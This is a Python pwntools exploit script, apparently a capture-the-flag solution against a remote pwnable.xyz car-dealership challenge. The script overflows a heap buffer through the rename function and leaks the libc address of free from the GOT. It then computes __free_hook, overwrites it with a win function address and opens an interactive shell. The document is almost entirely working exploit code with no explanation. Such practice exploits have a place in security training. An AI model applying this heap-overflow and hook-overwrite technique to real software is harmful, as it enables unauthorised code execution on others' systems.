from pwn import *


#sh = process('./challenge')
sh = remote('svc.pwnable.xyz', 30037)
#libc =  ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
def buy_car(car):
    sh.sendlineafter('> ', '1')
    sh.sendlineafter('> ', car)

def sell_car(name):
    sh.sendlineafter('> ', '2')
    sh.sendlineafter(': ', name)

def re_model(old, new):
    sh.sendlineafter('> ', '3')
    sh.sendlineafter(': ', old)
    sh.sendlineafter(': ', new)

def list_cars():
    sh.sendlineafter('> ', '4')

free_got = 0x601f70
win = 0x400b4e
free_offset = 0x77760
hook_offset = 0x3987c8
buy_car(str(2))
re_model("Toyota", "A"*0x40)
buy_car(str(1))
payload1 = "A"*0x10 + "B"*0x8 + "C"*0x8 + p64(free_got)
re_model("A"*0x5, payload1)
list_cars()
sh.recvline()
sh.recvline()
free_ptr = u64(sh.recvline()[6:12].ljust(8, '\x00'))
libc_base = free_ptr - free_offset #libc.symbols['__libc_free']
print hex(libc_base)
free_hook = libc_base + hook_offset#libc.symbols['__free_hook']
print hex(free_hook)

re_model(payload1, "A"*0x28)
payload2 = "A"*0x10 + "B"*0x8 + "C"*0x8 + p64(free_hook)
re_model("A"*0x22, payload2)
re_model("\x00", p64(win))
sh.interactive()



